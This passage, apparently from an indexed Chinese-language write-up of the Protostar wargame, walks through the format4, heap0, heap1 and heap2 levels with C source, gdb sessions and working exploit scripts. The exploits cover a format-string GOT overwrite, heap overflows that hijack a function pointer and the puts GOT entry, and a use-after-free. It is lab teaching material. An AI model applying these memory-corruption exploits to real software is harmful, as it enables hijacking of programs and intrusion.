<vuln+1>: mov ebp,esp 0x080484d5 <vuln+3>: sub esp,0x218 0x080484db <vuln+9>: mov eax,ds:0x8049730 0x080484e0 <vuln+14>: mov DWORD PTR [ esp+0x8 ] ,eax 0x080484e4 <vuln+18>: mov DWORD PTR [ esp+0x4 ] ,0x200 0x080484ec <vuln+26>: lea eax, [ ebp-0x208 ] 0x080484f2 <vuln+32>: mov DWORD PTR [ esp ] ,eax 0x080484f5 <vuln+35>: call 0x804839c <fgets@plt> 0x080484fa <vuln+40>: lea eax, [ ebp-0x208 ] 0x08048500 <vuln+46>: mov DWORD PTR [ esp ] ,eax 0x08048503 <vuln+49>: call 0x80483cc <printf@plt> 0x08048508 <vuln+54>: mov DWORD PTR [ esp ] ,0x1 0x0804850f <vuln+61>: call 0x80483ec <exit@plt> End of assembler dump. ( gdb ) disassemble 0x80483ec Dump of assembler code for function exit@plt: 0x080483ec <exit@plt+0>: jmp DWORD PTR ds:0x8049724 0x080483f2 <exit@plt+6>: push 0x30 0x080483f7 <exit@plt+11>: jmp 0x804837c End of assembler dump. ( gdb ) x 0x8049724 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: 0x080483f2 \u6d4b\u8bd5\u8986\u76d6 exit \u51fd\u6570 GOT \u8868\u6761\u76ee\u8df3\u8f6c hello \u51fd\u6570\u7684\u53ef\u884c\u6027 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ( gdb ) break *0x08048508 Breakpoint 1 at 0x8048508: file format4/format4.c, line 22 . ( gdb ) r Starting program: /opt/protostar/bin/format4 Test input Test input Breakpoint 1 , vuln () at format4/format4.c:22 22 format4/format4.c: No such file or directory. in format4/format4.c ( gdb ) set { int } 0x8049724 = 0x80484b4 ( gdb ) x 0x8049724 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: 0x080484b4 ( gdb ) c Continuing. code execution redirected! you win Program exited with code 01 . \u89c2\u5bdf\u8f93\u5165\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e 1 2 $ python -c \"print('%x ' * 20)\" | ./format4 200 b7fd8420 bffff524 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7ff000a 0 0x080484b4 \u8f83\u5927\uff0c\u76f4\u63a5\u901a\u8fc7\u8bbe\u7f6e\u8f93\u51fa\u6700\u5c0f\u5bbd\u5ea6\u6765\u8865\u8db3\u5b57\u7b26\u7684\u8bdd\u6253\u5370\u4f1a\u6d88\u8017\u8f83\u957f\u65f6\u95f4\uff0c\u53ef\u4ee5\u62c6\u5206\u6210\u4e24\u90e8\u5206\u8fdb\u884c\u4fee\u6539 \u5b9e\u9645\u6bcf\u6b21\u4fee\u6539 \\(4\\) \u5b57\u8282","title":"Format 4"},{"location":"wargames/protostar/format/#exploit_4","text":"1 2 3 4 5 6 7 8 9 10 11 import struct exit_got = 0x08049724 exploit = '' exploit += struct . pack ( 'I' , exit_got ) exploit += struct . pack ( 'I' , exit_got + 2 ) exploit += ' %33964x ' # 0x84b4 - 8 exploit += '%4$n' exploit += ' %33616x ' # 0x10804 - 0x84b4 exploit += '%5$n' print exploit 1 2 3 4 $ python /tmp/format.py | ./format4 ... b7fd8420 code execution redirected! you win","title":"Exploit"},{"location":"wargames/protostar/heap/","text":"The levels to be exploited can be found in the /opt/protostar/bin directory. Heap 0 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include <stdlib.h> #include <unistd.h> #include <string.h> #include <stdio.h> #include <sys/types.h> struct data { char name [ 64 ]; }; struct fp { int ( * fp )(); }; void winner () { printf ( \"level passed \\n \" ); } void nowinner () { printf ( \"level has not been passed \\n \" ); } int main ( int argc , char ** argv ) { struct data * d ; struct fp * f ; d = malloc ( sizeof ( struct data )); // 64 bytes f = malloc ( sizeof ( struct fp )); // 4 bytes f -> fp = nowinner ; printf ( \"data is at %p, fp is at %p \\n \" , d , f ); strcpy ( d -> name , argv [ 1 ]); f -> fp (); } \u9700\u8981\u4fee\u6539 f->fp \u7684\u503c\uff0c\u4f7f\u5176\u6307\u5411 winner \u51fd\u6570 \u67e5\u770b d->name \u6ea2\u51fa\u540e\u5bf9 f->fp \u7684\u5f71\u54cd 1 2 3 4 s = '' for i in range ( 0x41 , 0x5b ): s += chr ( i ) * 4 print s 1 2 3 4 5 6 7 8 $ gdb ./heap0 ( gdb ) r ` python /tmp/heap.py ` Starting program: /opt/protostar/bin/heap0 ` python /tmp/heap.py ` data is at 0x804a008, fp is at 0x804a050 Program received signal SIGSEGV, Segmentation fault. 0x53535353 in ?? () # S winner \u51fd\u6570\u7684\u5730\u5740 1 2 ( gdb ) x winner 0x8048464 <winner>: 0x83e58955 Exploit \u00b6 1 2 3 $ ./heap0 $( python -c \"print 'A' * 72 + '\\x64\\x84\\x04\\x08'\" ) data is at 0x804a008, fp is at 0x804a050 level passed Heap 1 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include <stdlib.h> #include <unistd.h> #include <string.h> #include <stdio.h> #include <sys/types.h> struct internet { int priority ; char * name ; }; void winner () { printf ( \"and we have a winner @ %d \\n \" , time ( NULL )); } int main ( int argc , char ** argv ) { struct internet * i1 , * i2 , * i3 ; // i1 points to the start of 8 bytes in memory i1 = malloc ( sizeof ( struct internet )); i1 -> priority = 1 ; i1 -> name = malloc ( 8 ); // i1 + 4 i2 = malloc ( sizeof ( struct internet )); i2 -> priority = 2 ; i2 -> name = malloc ( 8 ); strcpy ( i1 -> name , argv [ 1 ]); // \u8d85\u8fc7 8 \u5b57\u8282\u5c06\u4f1a\u5f71\u54cd i2 \u5bf9\u5e94\u7684\u5185\u5b58 strcpy ( i2 -> name , argv [ 2 ]); printf ( \"and that's a wrap folks! \\n \" ); } \u67e5\u770b i1->name \u6ea2\u51fa\u5bf9 i2->name \u7684\u5f71\u54cd \u53ef\u4ee5\u6539\u53d8 i2->name \u7684\u503c\uff0c\u4ece\u800c\u80fd\u901a\u8fc7 strcpy \u5199\u5165\u4efb\u610f\u5730\u5740 1 2 3 4 5 6 7 8 9 $ gdb ./heap1 ( gdb ) r AAAABBBBCCCCDDDDEEEEFFFFGGGG 00001111222233334444 Starting program: /opt/protostar/bin/heap1 AAAABBBBCCCCDDDDEEEEFFFFGGGG 00001111222233334444 Program received signal SIGSEGV, Segmentation fault. *__GI_strcpy ( dest = 0x46464646 <Address 0x46464646 out of bounds>, # F src = 0xbffff8a1 \"00001111222233334444\" ) at strcpy.c:40 40 strcpy.c: No such file or directory. in strcpy.c \u6ce8\u610f\u5230\u6700\u540e\u8c03\u7528\u4e86 printf \u51fd\u6570\uff0c\u53ef\u4ee5\u8986\u76d6\u5176 GOT \u8868\u6761\u76ee 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x080484b9 <main+0>: push ebp 0x080484ba <main+1>: mov ebp,esp 0x080484bc <main+3>: and esp,0xfffffff0 0x080484bf <main+6>: sub esp,0x20 0x080484c2 <main+9>: mov DWORD PTR [ esp ] ,0x8 0x080484c9 <main+16>: call 0x80483bc <malloc@plt> 0x080484ce <main+21>: mov DWORD PTR [ esp+0x14 ] ,eax 0x080484d2 <main+25>: mov eax,DWORD PTR [ esp+0x14 ] 0x080484d6 <main+29>: mov DWORD PTR [ eax ] ,0x1 0x080484dc <main+35>: mov DWORD PTR [ esp ] ,0x8 0x080484e3 <main+42>: call 0x80483bc <malloc@plt> 0x080484e8 <main+47>: mov edx,eax 0x080484ea <main+49>: mov eax,DWORD PTR [ esp+0x14 ] 0x080484ee <main+53>: mov DWORD PTR [ eax+0x4 ] ,edx 0x080484f1 <main+56>: mov DWORD PTR [ esp ] ,0x8 0x080484f8 <main+63>: call 0x80483bc <malloc@plt> 0x080484fd <main+68>: mov DWORD PTR [ esp+0x18 ] ,eax 0x08048501 <main+72>: mov eax,DWORD PTR [ esp+0x18 ] 0x08048505 <main+76>: mov DWORD PTR [ eax ] ,0x2 0x0804850b <main+82>: mov DWORD PTR [ esp ] ,0x8 0x08048512 <main+89>: call 0x80483bc <malloc@plt> 0x08048517 <main+94>: mov edx,eax 0x08048519 <main+96>: mov eax,DWORD PTR [ esp+0x18 ] 0x0804851d <main+100>: mov DWORD PTR [ eax+0x4 ] ,edx 0x08048520 <main+103>: mov eax,DWORD PTR [ ebp+0xc ] 0x08048523 <main+106>: add eax,0x4 0x08048526 <main+109>: mov eax,DWORD PTR [ eax ] 0x08048528 <main+111>: mov edx,eax 0x0804852a <main+113>: mov eax,DWORD PTR [ esp+0x14 ] 0x0804852e <main+117>: mov eax,DWORD PTR [ eax+0x4 ] 0x08048531 <main+120>: mov DWORD PTR [ esp+0x4 ] ,edx 0x08048535 <main+124>: mov DWORD PTR [ esp ] ,eax 0x08048538 <main+127>: call 0x804838c <strcpy@plt> 0x0804853d <main+132>: mov eax,DWORD PTR [ ebp+0xc ] 0x08048540 <main+135>: add eax,0x8 0x08048543 <main+138>: mov eax,DWORD PTR [ eax ] 0x08048545 <main+140>: mov edx,eax 0x08048547 <main+142>: mov eax,DWORD PTR [ esp+0x18 ] 0x0804854b <main+146>: mov eax,DWORD PTR [ eax+0x4 ] 0x0804854e <main+149>: mov DWORD PTR [ esp+0x4 ] ,edx 0x08048552 <main+153>: mov DWORD PTR [ esp ] ,eax 0x08048555 <main+156>: call 0x804838c <strcpy@plt> 0x0804855a <main+161>: mov DWORD PTR [ esp ] ,0x804864b 0x08048561 <main+168>: call 0x80483cc <puts@plt> # \u7531\u4e8e\u7f16\u8bd1\u4f18\u5316\uff0c\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f puts 0x08048566 <main+173>: leave 0x08048567 <main+174>: ret End of assembler dump. ( gdb ) disassemble 0x80483cc Dump of assembler code for function puts@plt: 0x080483cc <puts@plt+0>: jmp DWORD PTR ds:0x8049774 0x080483d2 <puts@plt+6>: push 0x30 0x080483d7 <puts@plt+11>: jmp 0x804835c End of assembler dump. ( gdb ) x 0x8049774 0x8049774 <_GLOBAL_OFFSET_TABLE_+36>: 0x080483d2 winner \u51fd\u6570\u7684\u5730\u5740 1 2 ( gdb ) x winner 0x8048494 <winner>: 0x83e58955 Exploit \u00b6 1 2 3 4 5 6 7 $ ./heap1 ` python -c \"print 'A' * 20 + '\\x74\\x97\\x04\\x08'\" ` ` python -c \"print '\\x94\\x84\\x04\\x08'\" ` and we have a winner @ 1662252909 $ ./heap1 \"`echo -ne \" AAAABBBBCCCCDDDDEEEE \\x 74 \\x 97 \\x 04 \\x 08 \"`\" \"`echo -ne \" \\x 94 \\x 84 \\x 04 \\x 08 \"`\" and we have a winner @ 1662253600 $ ./heap1 \"`/bin/echo -ne \" AAAABBBBCCCCDDDDEEEE \\x 74 \\x 97 \\x 04 \\x 08 \"`\" \"`/bin/echo -ne \" \\x 94 \\x 84 \\x 04 \\x 08 \"`\" and we have a winner @ 1662256772 # \u5728 gdb \u4e2d\u9700\u8981\u4f7f\u7528 /bin/echo\uff0c\u4f7f\u7528 echo \u5c06\u4e0d\u89e3\u6790\u53c2\u6570 -ne \u800c\u662f\u76f4\u63a5\u8f93\u51fa Additional \u00b6 \u5173\u4e8e\u5728 gdb \u4e2d\u4f7f\u7528 echo \u4e0d\u80fd\u6210\u529f\u7684\u95ee\u9898 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ gdb ./heap1 ( gdb ) break *0x080484ce Breakpoint 1 at 0x80484ce: file heap1/heap1.c, line 23 . ( gdb ) break *0x0804853d Breakpoint 2 at 0x804853d: file heap1/heap1.c, line 32 . ( gdb ) r \"`echo -ne \" AAAABBBBCCCCDDDDEEEE \\x 74 \\x 97 \\x 04 \\x 08 \"`\" \"`echo -ne \" \\x 94 \\x 84 \\x 04 \\x 08 \"`\" Starting program: /opt/protostar/bin/heap1 \"`echo -ne \" AAAABBBBCCCCDDDDEEEE \\x 74 \\x 97 \\x 04 \\x 08 \"`\" \"`echo -ne \" \\x 94 \\x 84 \\x 04 \\x 08 \"`\" Breakpoint 1 , 0x080484ce in main ( argc = 3 , argv = 0xbffff714 ) at heap1/heap1.c:23 23 in heap1/heap1.c ( gdb ) info registers eax 0x804a008 134520840 ecx 0xb7fd93a0 -1208118368 edx 0x804a000 134520832 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff640 0xbffff640 ebp 0xbffff668 0xbffff668 esi 0x0 0 edi 0x0 0 eip 0x80484ce 0x80484ce <main+21> eflags 0x200246 [ PF ZF IF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 ( gdb ) set $i1 = ( struct internet* ) 0x804a008 ( gdb ) print * $i1 $1 = { priority = 0 , name = 0x0 } ( gdb ) c Continuing. Breakpoint 2 , main ( argc = 3 , argv = 0xbffff714 ) at heap1/heap1.c:32 32 in heap1/heap1.c ( gdb ) print * $i1 $2 = { priority = 1 , name = 0x804a018 \"-ne AAAABBBBCCCCDDDDEEEE\\\\x74\\\\x97\\\\x04\\\\x08\" } Heap 2 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include <stdlib.h> #include <unistd.h> #include <string.h> #include <sys/types.h> #include <stdio.h> struct auth { char name [ 32 ]; int auth ; }; struct auth * auth ; char * service ; int main ( int argc , char ** argv ) { char line [ 128 ]; while ( 1 ) { printf ( \"[ auth = %p, service = %p ] \\n \" , auth , service ); if ( fgets ( line , sizeof ( line ), stdin ) == NULL ) break ; if ( strncmp ( line , \"auth \" , 5 ) == 0 ) { auth = malloc ( sizeof ( auth )); memset ( auth , 0 , sizeof ( auth )); // new allocated area can have old data if ( strlen ( line + 5 ) < 31 ) { strcpy ( auth -> name , line + 5 ); } } if ( strncmp ( line , \"reset\" , 5 ) == 0 ) { free ( auth ); } if ( strncmp ( line , \"service\" , 6 ) == 0 ) { service = strdup ( line + 7 ); // strdup(s) returns a pointer to a new string which is a duplicate of the string s. Memory for the new string is obtained with malloc. } if ( strncmp ( line , \"login\" , 5 ) == 0 ) { if ( auth -> auth ) { // use after free printf ( \"you have logged in already! \\n \" ); } else { printf ( \"please enter your password \\n \" ); } } } } \u4f7f\u7528\u6d4b\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ./heap2 [ auth = ( nil ) , service = ( nil ) ] auth admin [ auth = 0x804c008, service = ( nil ) ] login please enter your password [ auth = 0x804c008, service = ( nil ) ] reset [ auth = 0x804c008, service = ( nil ) ] login please enter your password [ auth = 0x804c008, service = ( nil ) ] service hack [ auth = 0x804c008, service = 0x804c008 ] # auth was freed and service got that free space there \u4f7f\u7528 gdb \u67e5\u770b\u5806\u7684\u4f7f\u7528\u60c5\u51b5 Dump of assembler code for function main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x08048934 <main+0>: push ebp 0x08048935 <main+1>: mov ebp,esp 0x08048937 <main+3>: and esp,0xfffffff0 0x0804893a <main+6>: sub esp,0x90 0x08048940 <main+12>: jmp 0x8048943 <main+15> 0x08048942 <main+14>: nop 0x08048943 <main+15>: mov ecx,DWORD PTR ds:0x804b5f8 0x08048949 <main+21>: mov edx,DWORD PTR ds:0x804b5f4 0x0804894f <main+27>: mov eax,0x804ad70 0x08048954 <main+32>: mov DWORD PTR [ esp+0x8 ] ,ecx 0x08048958 <main+36>: mov DWORD PTR [ esp+0x4 ] ,edx 0x0804895c <main+40>: mov DWORD PTR [ esp ] ,eax 0x0804895f <main+43>: call 0x804881c <printf@plt> 0x08048964 <main+48>: mov eax,ds:0x804b164 0x08048969 <main+53>: mov DWORD PTR [ esp+0x8 ] ,eax 0x0804896d <main+57>: mov DWORD PTR [ esp+0x4 ] ,0x80 0x08048975 <main+65>: lea eax, [ esp+0x10 ] 0x08048979 <main+69>: mov DWORD PTR [ esp ] ,eax 0x0804897c <main+72>: call 0x80487ac <fgets@plt> 0x08048981 <main+77>: test eax,eax 0x08048983 <main+79>: jne 0x8048987 <main+83> 0x08048985 <main+81>: leave 0x08048986 <main+82>: ret 0x08048987 <main+83>: mov DWORD PTR [ esp+0x8 ] ,0x5 0x0804898f <main+91>: mov DWORD PTR [ esp+0x4 ] ,0x804ad8d 0x08048997 <main+99>: lea eax, [ esp+0x10 ] 0x0804899b <main+103>: mov DWORD PTR [ esp ] ,eax 0x0804899e <main+106>: call 0x804884c <strncmp@plt> 0x080489a3 <main+111>: test eax,eax 0x080489a5 <main+113>: jne 0x8048a01 <main+205> 0x080489a7 <main+115>: mov DWORD PTR [ esp ] ,0x4 0x080489ae <main+122>: call 0x804916a <malloc> 0x080489b3 <main+127>: mov ds:0x804b5f4,eax 0x080489b8 <main+132>: mov eax,ds:0x804b5f4 0x080489bd <main+137>: mov DWORD PTR [ esp+0x8 ] ,0x4 0x080489c5 <main+145>: mov DWORD PTR [ esp+0x4 ] ,0x0 0x080489cd <main+153>: mov DWORD PTR [ esp ] ,eax 0x080489d0 <main+156>: call 0x80487bc <memset@plt> 0x080489d5 <main+161>: lea eax, [ esp+0x10 ] 0x080489d9 <main+165>: add eax,0x5 0x080489dc <main+168>: mov DWORD PTR [ esp ] ,eax 0x080489df <main+171>: call 0x80487fc <strlen@plt> 0x080489e4 <main+176>: cmp eax,0x1e 0x080489e7 <main+179>: ja 0x8048a01 <main+205> 0x080489e9 <main+181>: lea eax, [ esp+0x10 ] 0x080489ed <main+185>: lea edx, [ eax+0x5 ] 0x080489f0 <main+188>: mov eax,ds:0x804b5f4 0x080489f5 <main+193>: mov DWORD PTR [ esp+0x4 ] ,edx 0x080489f9 <main+197>: mov DWORD PTR [ esp ] ,eax 0x080489fc <main+200>: call 0x804880c <strcpy@plt> 0x08048a01 <main+205>: mov DWORD PTR [ esp+0x8 ] ,0x5 0x08048a09 <main+213>: mov DWORD PTR [ esp+0x4 ] ,0x804ad93 0x08048a11 <main+221>: lea eax, [ esp+0x10 ] 0x08048a15 <main+225>: mov DWORD PTR [ esp ] ,eax 0x08048a18 <main+228>: call 0x804884c <strncmp@plt> 0x08048a1d <main+233>: test eax,eax 0x08048a1f <main+235>: jne 0x8048a2e <main+250> 0x08048a21 <main+237>: mov eax,ds:0x804b5f4 0x08048a26 <main+242>: mov DWORD PTR [ esp ] ,eax 0x08048a29 <main+245>: call 0x804999c <free> 0x08048a2e <main+250>: mov DWORD PTR [ esp+0x8 ] ,0x6 0x08048a36 <main+258>: mov DWORD PTR [ esp+0x4 ] ,0x804ad99 0x08048a3e <main+266>: lea eax, [ esp+0x10 ] 0x08048a42 <main+270>: mov DWORD PTR [ esp ] ,eax 0x08048a45 <main+273>: call 0x804884c <strncmp@plt> 0x08048a4a <main+278>: test eax,eax 0x08048a4c <main+280>: jne 0x8048a62 <main+302> 0x08048a4e <main+282>: lea eax, [ esp+0x10 ] 0x08048a52 <main+286>: add eax,0x7 0x08048a55 <main+289>: mov DWORD PTR [ esp ] ,eax 0x08048a58 <main+292>: call 0x804886c <strdup@plt> 0x08048a5d <main+297>: mov ds:0x804b5f8,eax 0x08048a62 <main+302>: mov DWORD PTR [ esp+0x8 ] ,0x5 0x08048a6a <main+310>: mov DWORD PTR [ esp+0x4 ] ,0x804ada1 0x08048a72 <main+318>: lea eax, [ esp+0x10 ] 0x08048a76 <main+322>: mov DWORD PTR [ esp ] ,eax 0x08048a79 <main+325>: call 0x804884c <strncmp@plt> 0x08048a7e <main+330>: test eax,eax 0x08048a80 <main+332>: jne 0x8048942 <main+14> 0x08048a86 <main+338>: mov eax,ds:0x804b5f4 0x08048a8b <main+343>: mov eax,DWORD PTR [ eax+0x20 ] 0x08048a8e <main+346>: test eax,eax 0x08048a90 <main+348>: je 0x8048aa3 <main+367> 0x08048a92 <main+350>: mov DWORD PTR [ esp ] ,0x804ada7 0x08048a99 <main+357>: call 0x804883c <puts@plt> 0x08048a9e <main+362>: jmp 0x8048943 <main+15> 0x08048aa3 <main+367>: mov DWORD PTR [ esp ] ,0x804adc3 0x08048aaa <main+374>: call 0x804883c <puts@plt> 0x08048aaf <main+379>: jmp 0x8048943 <main+15> End of assembler dump. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 ( gdb ) r Starting program: /opt/protostar/bin/heap2 [ auth = ( nil ) , service = ( nil ) ] auth admin [ auth = 0x804c008, service = ( nil ) ] ^C Program received signal SIGINT, Interrupt. 0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82 82 ../sysdeps/unix/syscall-template.S: No such file or directory. in ../sysdeps/unix/syscall-template.S Current language: auto The current source language is \"auto; currently asm\" . ( gdb ) info proc mappings process 7281 cmdline = '/opt/protostar/bin/heap2' cwd = '/opt/protostar/bin' exe = '/opt/protostar/bin/heap2' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x804b000 0x3000 0 /opt/protostar/bin/heap2 0x804b000 0x804c000 0x1000 0x3000 /opt/protostar/bin/heap2 0x804c000 0x804d000 0x1000 0 [ heap ] 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fde000 0xb7fe2000 0x4000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] ( gdb ) break *0x0804895f # call 0x804881c <printf@plt> Breakpoint 1 at 0x804895f: file heap2/heap2.c, line 20 . ( gdb ) command # define what gdb commands shall be executed when the breakpoint is hit Type commands for when breakpoint 1 is hit, one per line. End with a line saying just \"end\" . >echo ------------------------------------------------- \\n >x/20wx 0x804c000 # print the heap >echo --------auth------------------------------------- \\n >print *auth >echo --------service---------------------------------- \\n >print service >echo ------------------------------------------------- \\n >continue >end 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 ( gdb ) r Starting program: /opt/protostar/bin/heap2 Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c Current language: auto The current source language is \"auto; currently c\" . ------------------------------------------------- 0x804c000: Cannot access memory at address 0x804c000 ( gdb ) c Continuing. [ auth = ( nil ) , service = ( nil ) ] auth admin Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x696d6461 0x00000a6e # \u5b9e\u9645\u4e0a sizeof(auth) \u8fd4\u56de\u7684\u662f\u6307\u9488 auth \u7684\u5927\u5c0f\uff084 bytes\uff09\u800c\u4e0d\u662f\u7ed3\u6784\u4f53 auth # \u8003\u8651\u5230\u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ea\u5206\u914d\u4e86 8 \u5b57\u8282\uff088 bytes header + 8 bytes data\uff09 0x804c010: 0x00000000 0x00000ff1 0x00000000 0x00000000 0x804c020: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $5 = { name = \"admin\\n\\000\\000\\000\\000\\000\\000\\361\\017\" , '\\000' <repeats 17 times>, auth = 0 } --------service---------------------------------- $6 = 0x0 ------------------------------------------------- [ auth = 0x804c008, service = ( nil ) ] reset Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- # the first word of the chunk data got replaced with 0 # because the first word in a free chunk is defined as the previous free chunk address # free chunks \u662f\u94fe\u8868\uff0c\u56e0\u4e3a\u6ca1\u6709\u5176\u5b83 free chunk\uff0c\u6240\u4ee5\u4e3a\u7a7a 0x804c000: 0x00000000 0x00000011 0x00000000 0x00000a6e 0x804c010: 0x00000000 0x00000ff1 0x00000000 0x00000000 0x804c020: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $7 = { name = \"\\000\\000\\000\\000n\\n\\000\\000\\000\\000\\000\\000\\361\\017\" , '\\000' <repeats 17 times>, auth = 0 } --------service---------------------------------- $8 = 0x0 ------------------------------------------------- [ auth = 0x804c008, service = ( nil ) ] service AAA Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x41414120 0x0000000a 0x804c010: 0x00000000 0x00000ff1 0x00000000 0x00000000 0x804c020: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $9 = { name = \" AAA\\n\\000\\000\\000\\000\\000\\000\\000\\361\\017\" , '\\000' <repeats 17 times>, auth = 0 } --------service---------------------------------- $10 = 0x804c008 \" AAA\\n\" ------------------------------------------------- [ auth = 0x804c008, service = 0x804c008 ] service BBB Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x41414120 0x0000000a 0x804c010: 0x00000000 0x00000011 0x42424220 0x0000000a 0x804c020: 0x00000000 0x00000fe1 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $11 = { name = \" AAA\\n\\000\\000\\000\\000\\000\\000\\000\\021\\000\\000\\000 BBB\\n\\000\\000\\000\\000\\000\\000\\000\\341\\017\\000\" , auth = 0 } --------service---------------------------------- $12 = 0x804c018 \" BBB\\n\" ------------------------------------------------- [ auth = 0x804c008, service = 0x804c018 ] service CCC Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x41414120 0x0000000a 0x804c010: 0x00000000 0x00000011 0x42424220 0x0000000a 0x804c020: 0x00000000 0x00000011 0x43434320 0x0000000a 0x804c030: 0x00000000 0x00000fd1 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- # struct auth { # char name[32]; # int auth; # }; # 0x804c008 + 0x20 = 0x804c028 $13 = { name = \" AAA\\n\\000\\000\\000\\000\\000\\000\\000\\021\\000\\000\\000 BBB\\n\\000\\000\\000\\000\\000\\000\\000\\021\\000\\000\" , auth = 1128481568 } # 0x43434320 --------service---------------------------------- $14 = 0x804c028 \" CCC\\n\" ------------------------------------------------- [ auth = 0x804c008, service = 0x804c028 ] login you have logged in already! \u7531\u4e8e\u52a8\u6001\u5206\u914d\u5927\u5c0f\u9519\u8bef\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8986\u76d6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 ( gdb ) r Starting program: /opt/protostar/bin/heap2 Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c Current language: auto The current source language is \"auto; currently c\" . ------------------------------------------------- 0x804c000: Cannot access memory at address 0x804c000 ( gdb ) c Continuing. [ auth = ( nil ) , service = ( nil ) ] auth admin Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 